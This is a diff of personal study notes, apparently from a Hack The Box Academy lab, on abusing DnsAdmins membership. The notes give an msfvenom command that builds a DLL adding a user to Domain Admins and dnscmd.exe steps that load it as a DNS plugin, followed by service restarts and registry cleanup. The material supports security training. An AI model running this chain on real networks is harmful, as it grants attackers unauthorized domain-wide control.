@@ -18,45 +18,24 @@ Get-ADGroupMember -Identity DnsAdmins
 
 ```
 
-**Creating and executing payload** 
-```bash  
-#Create payload 
-//[!question] help 
+**Create payload**
+```
 msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll <----
-
-#Start local ftp server 
-host@hostmachine> sudo python3 -m pip install pyftpdlib 
-
-host@hostmachine > sudo python3 -m pyftpdlib --port 21 -u user -P pass
-
-C:\htb> ftp 10.10.10.1 
-
-C:\htb> get adduser.dll
-
-C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Path\to\adduser <-------------------
-
-
-
 ```
+**Transfer to Machine** 
 
-Finding SID 
+**Run the dnscmd.exe**
 ```
-(Get-LocalUser -Name "netadm").SID
-
-sc.exe sdshow DNS 
-
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
 ```
-
-
-**Restarting DNS Process** 
-``
-Confirm Key Is Added -> Remove Key ->  Start Service Again 
+**Run netstart and net stop**
 ```
-C:\Windows\System32> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
-
-C:\Windows\System32> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
-
-sc.exe start dns 
+net start
+net stop
+```
+**Verify**
+```
+net group "Domain Admins" /dom
 ```
 
 **WPAD Record**: A method used by clients to locate URI of a configuration file using DHCP and/or DNS discovery methods 
@@ -69,9 +48,9 @@ Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerN
 
 - for some reason sc.exe query dns works well but sc query dns does not work 
 
-> [!NOTE] Title
->  Recommended to use CMD, not powershell 
->  Recs also include using net start and net stop instead of sc.exe start dns https://forum.hackthebox.com/t/htb-academy-windows-privilege-escalation-dnsadmins/243482/31
+>[!NOTE] 
+>Recommended to use CMD, not powershell 
+>Recs also include using net start and net stop instead of sc.exe start dns https://forum.hackthebox.com/t/htb-academy-windows-privilege-escalation-dnsadmins/243482/31
 
 ## Hyper-V Administrators
 
